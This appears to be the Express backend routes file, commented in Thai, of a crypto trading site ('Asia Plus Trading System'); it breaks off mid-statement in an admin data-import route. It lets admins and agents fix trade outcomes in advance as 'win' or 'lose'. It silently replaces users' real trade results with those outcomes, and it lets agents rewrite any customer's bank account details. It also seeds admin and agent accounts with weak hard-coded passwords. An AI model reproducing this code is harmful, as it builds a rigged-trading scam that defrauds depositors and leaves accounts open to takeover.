import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { setupAuth } from "./auth";
import { getMarketData, getCryptoById } from "./crypto-api";
import { insertTradeSchema, insertBankAccountSchema, trades, bankAccounts, settings, users, transactions, type User } from "@shared/schema";
import { ZodError } from "zod";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";
import bcrypt from "bcryptjs";
import { registerSettingsRoutes } from "./settings";
import { db } from "./db";
import { eq } from "drizzle-orm";
import fs from 'fs';

// Helper function for hashing passwords - ใช้ bcrypt เหมือนใน auth.ts
async function hashPassword(password: string) {
  const salt = await bcrypt.genSalt(10);
  return bcrypt.hash(password, salt);
}

// Helper function for comparing passwords - ใช้ bcrypt เหมือนใน auth.ts
async function comparePasswords(supplied: string, stored: string) {
  try {
    return await bcrypt.compare(supplied, stored);
  } catch (error) {
    console.error('Error comparing passwords:', error);
    return false;
  }
}

// Middleware to check if user is authenticated
const isAuthenticated = (req: Request, res: Response, next: Function) => {
  if (req.isAuthenticated()) {
    return next();
  }
  res.status(401).json({ message: "Unauthorized" });
};

// Middleware to check if user is admin
const isAdmin = (req: Request, res: Response, next: Function) => {
  if (req.isAuthenticated() && req.user.role === "admin") {
    return next();
  }
  res.status(403).json({ message: "Forbidden" });
};

// Middleware to check if user is admin or agent
const isAdminOrAgent = (req: Request, res: Response, next: Function) => {
  if (req.isAuthenticated() && (req.user.role === "admin" || req.user.role === "agent")) {
    return next();
  }
  res.status(403).json({ message: "Forbidden" });
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication routes
  setupAuth(app);

  // Crypto market data routes
  app.get("/api/crypto/market", async (req, res) => {
    try {
      const data = await getMarketData();
      res.json(data);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch market data" });
    }
  });

  app.get("/api/crypto/:id", async (req, res) => {
    try {
      const crypto = await getCryptoById(req.params.id);
      if (!crypto) {
        return res.status(404).json({ message: "Cryptocurrency not found" });
      }
      res.json(crypto);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch cryptocurrency data" });
    }
  });

  // Trading routes
  app.post("/api/trades", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const tradeData = insertTradeSchema.parse({
        ...req.body,
        userId: req.user.id
      });
      
      const trade = await storage.createTrade(tradeData);
      res.status(201).json(trade);
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else {
        res.status(500).json({ message: "Failed to create trade" });
      }
    }
  });

  app.get("/api/trades", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const trades = await storage.getTradesByUser(req.user.id);
      res.json(trades);
    } catch (error) {
      console.error("Error fetching trades:", error);
      res.status(500).json({ message: "Failed to fetch trades" });
    }
  });
  
  // อัพเดทสถานะการเทรด
  app.patch("/api/trades/:id", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const tradeId = parseInt(req.params.id);
      if (isNaN(tradeId)) {
        return res.status(400).json({ message: "Invalid trade ID" });
      }
      
      // ตรวจสอบว่าสถานะที่ส่งมาถูกต้อง
      let { status, result } = req.body;
      
      // ดึงข้อมูลการเทรดจาก storage
      const userTrades = await storage.getTradesByUser(req.user.id);
      const originalTrade = userTrades.find(trade => trade.id === tradeId);
      
      if (!originalTrade) {
        console.error(`ไม่พบข้อมูลการเทรด ID: ${tradeId} ของผู้ใช้ ID: ${req.user.id}`);
        return res.status(404).json({ message: "Trade not found" });
      }
      
      console.log(`กำลังอัพเดทสถานะการเทรด ID: ${tradeId} เป็น ${status} ผลลัพธ์: ${result}`);
      
      // ถ้ามีการกำหนดผลลัพธ์ล่วงหน้า ให้ใช้ผลลัพธ์นั้นแทนผลลัพธ์ที่ส่งมา
      if (originalTrade.predeterminedResult && status === "completed") {
        console.log(`ใช้ผลลัพธ์ที่กำหนดล่วงหน้า: ${originalTrade.predeterminedResult} แทนผลจริง: ${result}`);
        result = originalTrade.predeterminedResult;
      }
      
      if (!status || (status === "completed" && !result)) {
        return res.status(400).json({ message: "Invalid status or missing result" });
      }
      
      // อัพเดทสถานะในฐานข้อมูล
      const updatedTrade = await storage.updateTradeStatus(tradeId, status, result);
      
      if (!updatedTrade) {
        return res.status(404).json({ message: "Trade not found" });
      }
      
      res.json(updatedTrade);
    } catch (error) {
      console.error("Error updating trade status:", error);
      res.status(500).json({ message: "Failed to update trade status" });
    }
  });
  
  // เพิ่ม endpoint สำหรับแอดมินกำหนดผลการเทรดล่วงหน้า
  app.patch("/api/admin/trades/:id/predetermined", isAdminOrAgent, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const tradeId = parseInt(req.params.id);
      if (isNaN(tradeId)) {
        return res.status(400).json({ message: "Invalid trade ID" });
      }
      
      // ตรวจสอบว่าค่าที่ส่งมาถูกต้อง
      const { predeterminedResult } = req.body;
      // ถ้า null คือลบการกำหนดผลลัพธ์ล่วงหน้า
      if (predeterminedResult !== null && !["win", "lose"].includes(predeterminedResult)) {
        return res.status(400).json({ message: "Invalid predetermined result. Must be 'win', 'lose', or null" });
      }
      
      // อัพเดทผลล่วงหน้าในฐานข้อมูล
      const updatedTrade = await storage.updateTradeStatus(
        tradeId, 
        "active", // ไม่เปลี่ยนสถานะ
        undefined, // ไม่เปลี่ยนผลลัพธ์
        predeterminedResult // กำหนดผลล่วงหน้า
      );
      
      if (!updatedTrade) {
        return res.status(404).json({ message: "Trade not found" });
      }
      
      res.json(updatedTrade);
    } catch (error) {
      console.error("Error updating predetermined result:", error);
      res.status(500).json({ message: "Failed to update predetermined result" });
    }
  });

  // Admin routes
  app.get("/api/admin/users", isAdminOrAgent, async (req, res) => {
    try {
      let users = await storage.getAllUsers();
      
      // หาก user เป็น agent จะเห็นเฉพาะผู้ใช้ที่ไม่ใช่ admin
      if (req.user?.role === "agent") {
        users = users.filter(user => user.role !== "admin");
      }
      
      // Remove passwords from response
      const sanitizedUsers = users.map(user => ({
        ...user,
        password: undefined
      }));
      res.json(sanitizedUsers);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });
  
  // ดึงบัญชีธนาคารของผู้ใช้งานสำหรับแอดมิน
  app.get("/api/admin/users/:userId/bank-accounts", isAdminOrAgent, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      if (isNaN(userId)) {
        return res.status(400).json({ message: "Invalid user ID" });
      }
      
      const bankAccounts = await storage.getBankAccountsByUser(userId);
      res.json(bankAccounts);
    } catch (error) {
      console.error("Error getting user bank accounts:", error);
      res.status(500).json({ message: "Failed to get bank accounts" });
    }
  });
  
  // แก้ไขบัญชีธนาคารของผู้ใช้งานสำหรับแอดมิน
  app.patch("/api/admin/bank-accounts/:id", isAdminOrAgent, async (req, res) => {
    try {
      const bankAccountId = parseInt(req.params.id);
      if (isNaN(bankAccountId)) {
        return res.status(400).json({ message: "Invalid bank account ID" });
      }
      
      // รับข้อมูลที่จะแก้ไข
      const { bankName, accountNumber, accountName, isDefault } = req.body;
      if (!bankName || !accountNumber || !accountName) {
        return res.status(400).json({ message: "Bank name, account number, and account name are required" });
      }
      
      // แก้ไขข้อมูลบัญชี
      const updatedBankAccount = await db
        .update(bankAccounts)
        .set({
          bankName: bankName,
          accountNumber: accountNumber,
          accountName: accountName,
          isDefault: isDefault === true,
          updatedAt: new Date().toISOString()
        })
        .where(eq(bankAccounts.id, bankAccountId))
        .returning();
      
      res.json(updatedBankAccount);
    } catch (error) {
      console.error("Error updating bank account:", error);
      res.status(500).json({ message: "Failed to update bank account" });
    }
  });

  app.get("/api/admin/trades", isAdminOrAgent, async (req, res) => {
    try {
      const trades = await storage.getAllTrades();
      res.json(trades);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch trades" });
    }
  });

  // Wallet routes
  // Schema สำหรับตรวจสอบข้อมูลการฝากเงิน
  const depositSchema = z.object({
    amount: z.string().refine((val) => !isNaN(parseFloat(val)) && parseFloat(val) > 0, {
      message: "Amount must be a positive number",
    }),
    method: z.string().min(1),
    paymentProofBase64: z.string().optional(),
  });

  // Schema สำหรับตรวจสอบข้อมูลการถอนเงิน
  const withdrawSchema = z.object({
    amount: z.string().refine((val) => !isNaN(parseFloat(val)) && parseFloat(val) > 0, {
      message: "Amount must be a positive number",
    }),
    method: z.string().min(1),
    bankAccount: z.string().optional(),
    bankName: z.string().optional(),
  });

  // API endpoint สำหรับฝากเงิน
  app.post("/api/wallet/deposit", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const data = depositSchema.parse(req.body);
      
      // สร้างรายการธุรกรรมใหม่ (สถานะ pending ต้องรอแอดมินอนุมัติ)
      const transactionData = {
        userId: req.user.id,
        type: "deposit" as const,
        amount: data.amount,
        method: data.method,
        paymentProof: data.paymentProofBase64,
      };
      
      const transaction = await storage.createTransaction(transactionData);
      
      if (!transaction) {
        return res.status(500).json({ message: "Failed to create transaction" });
      }
      
      res.status(200).json({
        success: true,
        message: "Deposit request submitted successfully",
        transaction: {
          id: transaction.id,
          amount: transaction.amount,
          status: transaction.status
        }
      });
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else {
        console.error("Deposit error:", error);
        res.status(500).json({ message: "Failed to process deposit request" });
      }
    }
  });

  // API endpoint สำหรับถอนเงิน
  app.post("/api/wallet/withdraw", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const data = withdrawSchema.parse(req.body);
      
      // ดึงยอดเงินปัจจุบัน
      const currentBalance = await storage.getUserBalance(req.user.id);
      
      // ตรวจสอบว่ามีเงินเพียงพอหรือไม่
      if (parseFloat(currentBalance) < parseFloat(data.amount)) {
        return res.status(400).json({ message: "Insufficient balance" });
      }
      
      // หักเงินออกจากบัญชีทันที
      const newBalance = (parseFloat(currentBalance) - parseFloat(data.amount)).toString();
      console.log("[WITHDRAW] Current balance: " + currentBalance + ", New balance: " + newBalance);
      const result = await storage.updateUserBalance(req.user.id, newBalance);
      console.log("[WITHDRAW] Result of balance update:", result?.balance);
      
      // สร้างรายการธุรกรรมใหม่ (สถานะ pending ต้องรอแอดมินอนุมัติ)
      const transactionData = {
        userId: req.user.id,
        type: "withdraw" as const,
        amount: data.amount,
        method: data.method,
        bankName: data.bankName,
        bankAccount: data.bankAccount,
        note: "เงินถูกตัดจากบัญชีแล้ว รอการอนุมัติ"
      };
      
      const transaction = await storage.createTransaction(transactionData);
      
      if (!transaction) {
        // ถ้าสร้างธุรกรรมไม่สำเร็จ ให้คืนเงินกลับเข้าบัญชี
        await storage.updateUserBalance(req.user.id, currentBalance);
        return res.status(500).json({ message: "Failed to create transaction" });
      }
      
      res.status(200).json({
        success: true,
        message: "Withdrawal request submitted successfully",
        transaction: {
          id: transaction.id,
          amount: transaction.amount,
          status: transaction.status
        }
      });
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else {
        console.error("Withdraw error:", error);
        res.status(500).json({ message: "Failed to process withdrawal request" });
      }
    }
  });
  
  // API endpoint สำหรับดึงประวัติธุรกรรมของผู้ใช้
  app.get("/api/wallet/transactions", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const transactions = await storage.getTransactionsByUser(req.user.id);
      res.json(transactions);
    } catch (error) {
      console.error("Error fetching transactions:", error);
      res.status(500).json({ message: "Failed to fetch transactions" });
    }
  });
  
  // API endpoint สำหรับแอดมินดึงรายการธุรกรรมทั้งหมด
  app.get("/api/admin/transactions", isAdminOrAgent, async (req, res) => {
    try {
      const transactions = await storage.getAllTransactions();
      res.json(transactions);
    } catch (error) {
      console.error("Error fetching all transactions:", error);
      res.status(500).json({ message: "Failed to fetch transactions" });
    }
  });
  
  // API endpoint สำหรับแอดมินอัพเดทสถานะธุรกรรม
  app.patch("/api/admin/transactions/:id", isAdminOrAgent, async (req, res) => {
    try {
      const transactionId = parseInt(req.params.id);
      if (isNaN(transactionId)) {
        return res.status(400).json({ message: "Invalid transaction ID" });
      }
      
      const { status, note } = req.body;
      if (!status || !["approved", "rejected", "frozen"].includes(status)) {
        return res.status(400).json({ message: "Invalid status" });
      }
      
      const transaction = await storage.updateTransactionStatus(transactionId, status, note);
      if (!transaction) {
        return res.status(404).json({ message: "Transaction not found" });
      }
      
      res.json(transaction);
    } catch (error) {
      console.error("Error updating transaction:", error);
      res.status(500).json({ message: "Failed to update transaction" });
    }
  });

  // -------------- Bank Account API Routes --------------
  
  // ดึงบัญชีธนาคารของผู้ใช้
  app.get("/api/bank-accounts", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const bankAccounts = await storage.getBankAccountsByUser(req.user.id);
      res.json(bankAccounts);
    } catch (error) {
      console.error("Error fetching bank accounts:", error);
      res.status(500).json({ message: "Failed to fetch bank accounts" });
    }
  });
  
  // เพิ่มบัญชีธนาคารใหม่
  app.post("/api/bank-accounts", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      // ตรวจสอบจำนวนบัญชีที่มีอยู่ (จำกัดไม่เกิน 2 บัญชี)
      const existingAccounts = await storage.getBankAccountsByUser(req.user.id);
      if (existingAccounts.length >= 2) {
        return res.status(400).json({ 
          message: "คุณสามารถเพิ่มบัญชีได้สูงสุด 2 บัญชีเท่านั้น กรุณาลบบัญชีเดิมก่อน" 
        });
      }
      
      const bankAccountData = insertBankAccountSchema.parse({
        ...req.body,
        userId: req.user.id
      });
      
      const bankAccount = await storage.createBankAccount(bankAccountData);
      res.status(201).json(bankAccount);
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else if (error instanceof Error) {
        console.error("Error creating bank account:", error);
        res.status(400).json({ message: error.message });
      } else {
        res.status(500).json({ message: "Failed to create bank account" });
      }
    }
  });
  
  // ตั้งเป็นบัญชีหลัก
  app.patch("/api/bank-accounts/:id/default", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const bankAccountId = parseInt(req.params.id);
      if (isNaN(bankAccountId)) {
        return res.status(400).json({ message: "Invalid bank account ID" });
      }
      
      // ตรวจสอบว่าเป็นบัญชีของผู้ใช้หรือไม่
      const bankAccount = await storage.getBankAccountById(bankAccountId);
      if (!bankAccount || bankAccount.userId !== req.user.id) {
        return res.status(403).json({ message: "You don't have permission to update this bank account" });
      }
      
      const updatedBankAccount = await storage.updateBankAccountDefault(bankAccountId, true);
      res.json(updatedBankAccount);
    } catch (error) {
      console.error("Error updating bank account:", error);
      res.status(500).json({ message: "Failed to update bank account" });
    }
  });
  
  // แก้ไขข้อมูลบัญชีธนาคาร
  app.patch("/api/bank-accounts/:id", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const bankAccountId = parseInt(req.params.id);
      if (isNaN(bankAccountId)) {
        return res.status(400).json({ message: "Invalid bank account ID" });
      }
      
      // ตรวจสอบว่าเป็นบัญชีของผู้ใช้หรือไม่
      const bankAccount = await storage.getBankAccountById(bankAccountId);
      if (!bankAccount || bankAccount.userId !== req.user.id) {
        return res.status(403).json({ message: "You don't have permission to modify this bank account" });
      }
      
      // รับข้อมูลที่จะแก้ไข
      const { bankName, accountNumber, accountName } = req.body;
      if (!bankName || !accountNumber || !accountName) {
        return res.status(400).json({ message: "Bank name, account number, and account name are required" });
      }
      
      // แก้ไขข้อมูลบัญชี
      const updatedBankAccount = await storage.updateBankAccount(bankAccountId, {
        bankName,
        accountNumber,
        accountName
      });
      
      res.json(updatedBankAccount);
    } catch (error) {
      console.error("Error updating bank account:", error);
      res.status(500).json({ message: "Failed to update bank account" });
    }
  });
  
  // ลบบัญชีธนาคาร
  app.delete("/api/bank-accounts/:id", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const bankAccountId = parseInt(req.params.id);
      if (isNaN(bankAccountId)) {
        return res.status(400).json({ message: "Invalid bank account ID" });
      }
      
      // ตรวจสอบว่าเป็นบัญชีของผู้ใช้หรือไม่
      const bankAccount = await storage.getBankAccountById(bankAccountId);
      if (!bankAccount || bankAccount.userId !== req.user.id) {
        return res.status(403).json({ message: "You don't have permission to delete this bank account" });
      }
      
      await storage.deleteBankAccount(bankAccountId);
      res.status(204).send();
    } catch (error) {
      console.error("Error deleting bank account:", error);
      res.status(500).json({ message: "Failed to delete bank account" });
    }
  });
  
  // ปรับปรุง API endpoint สำหรับถอนเงินให้รองรับการใช้บัญชีที่ผูกไว้
  app.post("/api/wallet/withdraw-with-saved-account", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const schema = z.object({
        amount: z.string().refine((val) => !isNaN(parseFloat(val)) && parseFloat(val) > 0, {
          message: "Amount must be a positive number",
        }),
        bankAccountId: z.number(),
      });
      
      const data = schema.parse(req.body);
      
      // ดึงข้อมูลบัญชีธนาคาร
      const bankAccount = await storage.getBankAccountById(data.bankAccountId);
      if (!bankAccount || bankAccount.userId !== req.user.id) {
        return res.status(400).json({ message: "Invalid bank account" });
      }
      
      // ดึงยอดเงินปัจจุบัน
      const currentBalance = await storage.getUserBalance(req.user.id);
      
      // ตรวจสอบว่ามีเงินเพียงพอหรือไม่
      if (parseFloat(currentBalance) < parseFloat(data.amount)) {
        return res.status(400).json({ message: "Insufficient balance" });
      }
      
      // คำนวณค่าธรรมเนียม 3%
      const amount = parseFloat(data.amount);
      const fee = amount * 0.03;
      const finalAmount = amount - fee;
      
      // หักเงินออกจากบัญชีทันที
      const newBalance = (parseFloat(currentBalance) - parseFloat(data.amount)).toString();
      console.log("[WITHDRAW] Current balance: " + currentBalance + ", New balance: " + newBalance);
      const result = await storage.updateUserBalance(req.user.id, newBalance);
      console.log("[WITHDRAW] Result of balance update:", result?.balance);
      
      // สร้างรายการธุรกรรมใหม่ (สถานะ pending ต้องรอแอดมินอนุมัติ)
      const transactionData = {
        userId: req.user.id,
        type: "withdraw" as const,
        amount: data.amount,  // จำนวนเงินที่ขอถอนก่อนหักค่าธรรมเนียม
        method: "bank",
        bankName: bankAccount.bankName,
        bankAccount: bankAccount.accountNumber,
        note: `เงินถูกตัดจากบัญชีแล้ว รอการอนุมัติ | ค่าธรรมเนียม 3%: ${fee.toFixed(2)} บาท ยอดสุทธิ: ${finalAmount.toFixed(2)} บาท`,
      };
      
      const transaction = await storage.createTransaction(transactionData);
      
      if (!transaction) {
        // ถ้าสร้างธุรกรรมไม่สำเร็จ ให้คืนเงินกลับเข้าบัญชี
        await storage.updateUserBalance(req.user.id, currentBalance);
        return res.status(500).json({ message: "Failed to create transaction" });
      }
      
      res.status(200).json({
        success: true,
        message: "Withdrawal request submitted successfully",
        transaction: {
          id: transaction.id,
          amount: transaction.amount,
          status: transaction.status,
          bankAccount: {
            bankName: bankAccount.bankName,
            accountNumber: bankAccount.accountNumber,
            accountName: bankAccount.accountName,
          }
        }
      });
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else {
        console.error("Withdraw error:", error);
        res.status(500).json({ message: "Failed to process withdrawal request" });
      }
    }
  });

  // -------------- Profile API Routes --------------
  
  // Schema สำหรับอัพเดทข้อมูลโปรไฟล์
  const updateProfileSchema = z.object({
    email: z.string().email().optional(),
    displayName: z.string().optional(),
    phoneNumber: z.string().optional(),
    avatarUrl: z.string().optional(),
  });
  
  // Schema สำหรับเปลี่ยนรหัสผ่าน
  const changePasswordSchema = z.object({
    currentPassword: z.string().min(1, "Current password is required"),
    newPassword: z.string().min(6, "New password must be at least 6 characters"),
  });
  
  // API endpoint สำหรับอัพเดทข้อมูลโปรไฟล์
  app.patch("/api/user/profile", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const data = updateProfileSchema.parse(req.body);
      
      // อัพเดทข้อมูลผู้ใช้
      const updatedUser = await storage.updateUserProfile(req.user.id, data);
      
      if (!updatedUser) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // อัพเดทข้อมูลใน session
      req.login({
        ...updatedUser,
        createdAt: updatedUser.createdAt instanceof Date ? updatedUser.createdAt.toISOString() : updatedUser.createdAt,
        updatedAt: updatedUser.updatedAt instanceof Date ? updatedUser.updatedAt.toISOString() : updatedUser.updatedAt,
      }, (err) => {
        if (err) {
          return res.status(500).json({ message: "Session update failed" });
        }
        
        // ส่งข้อมูลผู้ใช้กลับไปโดยไม่เปิดเผยรหัสผ่าน
        const { password, ...userWithoutPassword } = updatedUser;
        res.json(userWithoutPassword);
      });
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else {
        console.error("Profile update error:", error);
        res.status(500).json({ message: "Failed to update profile" });
      }
    }
  });
  
  // API endpoint สำหรับเปลี่ยนรหัสผ่าน
  app.post("/api/user/change-password", isAuthenticated, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const data = changePasswordSchema.parse(req.body);
      
      // ดึงข้อมูลผู้ใช้
      const user = await storage.getUser(req.user.id);
      
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // ตรวจสอบรหัสผ่านปัจจุบัน
      const passwordMatch = await comparePasswords(data.currentPassword, user.password);
      
      if (!passwordMatch) {
        return res.status(400).json({ message: "Current password is incorrect" });
      }
      
      // แฮชรหัสผ่านใหม่
      const hashedPassword = await hashPassword(data.newPassword);
      
      // อัพเดทรหัสผ่าน
      const updatedUser = await storage.updateUserPassword(req.user.id, hashedPassword);
      
      if (!updatedUser) {
        return res.status(404).json({ message: "User not found" });
      }
      
      res.json({ message: "Password changed successfully" });
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        res.status(400).json({ message: validationError.message });
      } else {
        console.error("Password change error:", error);
        res.status(500).json({ message: "Failed to change password" });
      }
    }
  });

  // API endpoint สำหรับแอดมินแก้ไขข้อมูลผู้ใช้
  // ดึงข้อมูลบัญชีธนาคารทั้งหมดสำหรับแอดมิน
  app.get("/api/admin/bank-accounts", isAuthenticated, isAdmin, async (req, res) => {
    try {
      // ใช้ MemoryStorage แทน database
      const allBankAccounts = await db.select().from(bankAccounts);
      
      // ดึงข้อมูลผู้ใช้ทั้งหมด
      const users = await storage.getAllUsers();
      const usersMap = new Map(users.map(user => [user.id, user]));
      
      // รวมข้อมูลบัญชีธนาคารกับข้อมูลผู้ใช้
      const bankAccountsWithUsers = allBankAccounts.map((account: any) => {
        const user = usersMap.get(account.userId);
        return {
          ...account,
          user: user ? {
            id: user.id,
            username: user.username,
            email: user.email
          } : null
        };
      });
      
      res.json(bankAccountsWithUsers);
    } catch (error) {
      console.error("Error fetching bank accounts:", error);
      res.status(500).json({ message: "Failed to fetch bank accounts" });
    }
  });
  
  // แอดมินแก้ไขบัญชีธนาคาร
  app.patch("/api/admin/bank-accounts/:id", isAuthenticated, isAdmin, async (req, res) => {
    try {
      const bankAccountId = parseInt(req.params.id);
      if (isNaN(bankAccountId)) {
        return res.status(400).json({ message: "Invalid bank account ID" });
      }
      
      // ตรวจสอบว่ามีบัญชีนี้อยู่หรือไม่
      const bankAccount = await storage.getBankAccountById(bankAccountId);
      if (!bankAccount) {
        return res.status(404).json({ message: "Bank account not found" });
      }
      
      // ข้อมูลที่สามารถแก้ไขได้
      const { bankName, accountNumber, accountName } = req.body;
      
      // Validate the incoming data (basic validation)
      if (!bankName || !accountNumber || !accountName) {
        return res.status(400).json({ message: "Missing required fields" });
      }
      
      // ตรวจสอบว่าเลขที่บัญชีเป็นตัวเลขเท่านั้น
      if (!/^\d+$/.test(accountNumber)) {
        return res.status(400).json({ message: "Account number must contain only digits" });
      }
      
      // อัปเดตข้อมูลบัญชี - ใช้ MemoryStorage
      const updatedBankAccount = await storage.updateBankAccount(bankAccountId, {
        bankName,
        accountNumber,
        accountName
      });
      
      // ดึงข้อมูลที่อัปเดตแล้ว
      res.json(updatedBankAccount);
    } catch (error) {
      console.error("Error updating bank account:", error);
      res.status(500).json({ message: "Failed to update bank account" });
    }
  });
  
  app.patch("/api/admin/users/:id", isAuthenticated, isAdminOrAgent, async (req, res) => {
    try {
      if (!req.user) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const userId = parseInt(req.params.id);
      if (isNaN(userId)) {
        return res.status(400).json({ message: "Invalid user ID" });
      }
      
      // ดึงข้อมูลผู้ใช้
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // ข้อมูลที่อนุญาตให้อัพเดท
      const updateData: Partial<User> = {};
      
      if (req.body.email) updateData.email = req.body.email;
      if (req.body.fullName) updateData.fullName = req.body.fullName;
      
      // เฉพาะ admin เท่านั้นที่สามารถเปลี่ยนบทบาทได้
      if (req.body.role && req.user.role === "admin") {
        updateData.role = req.body.role;
      }
      
      if (req.body.balance) updateData.balance = req.body.balance;
      
      // อัพเดทรหัสผ่าน (ถ้ามี)
      if (req.body.password) {
        console.log("กำลังแฮชรหัสผ่านใหม่สำหรับผู้ใช้ ID:", userId);
        const hashedPassword = await hashPassword(req.body.password);
        console.log("รหัสผ่านที่แฮชแล้ว:", hashedPassword.substring(0, 20) + "...");
        updateData.password = hashedPassword;
      }
      
      // อัพเดทข้อมูลผู้ใช้
      if (Object.keys(updateData).length > 0) {
        const updatedUser = await storage.updateUser(userId, updateData);
        if (!updatedUser) {
          return res.status(404).json({ message: "User not found" });
        }
        
        res.json(updatedUser);
      } else {
        res.status(400).json({ message: "No data to update" });
      }
    } catch (error) {
      console.error("Error updating user:", error);
      res.status(500).json({ message: "Failed to update user" });
    }
  });

  // Admin Settings API
  app.get("/api/admin/settings", isAuthenticated, isAdmin, async (req, res) => {
    try {
      // ดึงการตั้งค่าทั้งหมดจาก database
      const allSettings = await db.select().from(settings);
      
      // แปลงเป็น object
      const settingsObj = allSettings.reduce((acc: any, setting: any) => {
        acc[setting.key] = setting.value;
        return acc;
      }, {} as Record<string, string>);
      
      res.json(settingsObj);
    } catch (error) {
      console.error("Error fetching settings:", error);
      res.status(500).json({ message: "Failed to fetch settings" });
    }
  });
  
  app.put("/api/admin/settings", isAuthenticated, isAdmin, async (req, res) => {
    try {
      const {
        trade_fee_percentage,
        withdrawal_fee_percentage,
        min_deposit_amount,
        min_withdrawal_amount,
        allow_trading,
        allow_registrations,
        maintenance_mode
      } = req.body;
      
      // รายการการตั้งค่าที่อนุญาตให้อัปเดต
      const allowedSettings = {
        trade_fee_percentage,
        withdrawal_fee_percentage,
        min_deposit_amount,
        min_withdrawal_amount,
        allow_trading,
        allow_registrations,
        maintenance_mode
      };
      
      // อัปเดตแต่ละการตั้งค่า
       for (const [key, value] of Object.entries(allowedSettings)) {
         if (value !== undefined) {
           await db
             .insert(settings)
             .values({ key, value: String(value) })
             .onConflictDoUpdate({
               target: settings.key,
               set: { value: String(value), updatedAt: new Date().toISOString() }
             });
         }
       }
      
      res.json({ message: "Settings updated successfully" });
    } catch (error) {
      console.error("Error updating settings:", error);
      res.status(500).json({ message: "Failed to update settings" });
    }
  });

  // Admin data import route
  app.post("/api/admin/import-data", isAuthenticated, isAdmin, async (req: Request, res: Response) => {
    try {
      console.log('🚀 Starting admin data import...');
      
      // Import production users first
      console.log('📥 Importing production users...');
      await db.insert(users).values([
        { id: 1, username: 'admin', email: 'admin@asiaplus.com', password: await hashPassword('admin123'), fullName: 'System Administrator', role: 'admin', balance: '0' },
        { id: 2, username: 'agent001', email: 'agent001@asiaplus.com', password: await hashPassword('agent123'), fullName: 'Agent 001', role: 'agent', balance: '0' },
        { id: 3, username: 'testuser1', email: 'test1@example.com', password: await hashPassword('test123'), fullName: 'Test User 1', role: 'user', balance: '10000' },
        { id: 4, username: 'testuser2', email: 'test2@example.com', password: await hashPassword('test123'), fullName: 'Test User 2', role: 'user', balance: '5000' },
        { id: 5, username: 'testuser3', email: 'test3@example.com', password: await hashPassword('test123'), fullName: 'Test User 3', role: 'user', balance: '15000' },
        { id: 6, username: 'demo', email: 'demo@example.com', password: await hashPassword('demo123'), fullName: 'Demo User', role: 'user', balance: '1000' },
        { id: 7, username: 'olduser', email: 'old@example.com', password: await hashPassword('old123'), fullName: 'Old User (from JSON)', role: 'user', balance: '50000' }
      ]).onConflictDoNothing();
      
      console.log('📥 Importing system settings...');
      await db.insert(settings).values([
        { id: 1, key: 'system_name', value: 'Asia Plus Trading System' },
        { id: 2, key: 'maintenance_mode', value: 'false' },
        { id: 3, key: 'trading_enabled', value: 'true' },
        { id: 4, key: 'min_trade_amount', value: '100' },
        { id: 5, key: 'max_trade_amount', value: '100000' },
        { id: 6, key: 'trade_fee_percentage', value: '2.5' },
        { id: 7, key: 'withdrawal_fee_percentage', value: '1.0' },
        { id: 8, key: 'min_deposit_amount', value: '100' },
        { id: 9, key: 'min_withdrawal_amount', value: '500' },
        { id: 10, key: 'allow_trading', value: 'true' },
        { id: 11, key: 'allow_registrations', value: 'true' }
      ]).onConflictDoNothing();
      
      console.log('📥 Importing bank accounts...');
      await db.insert(bankAccounts).values([
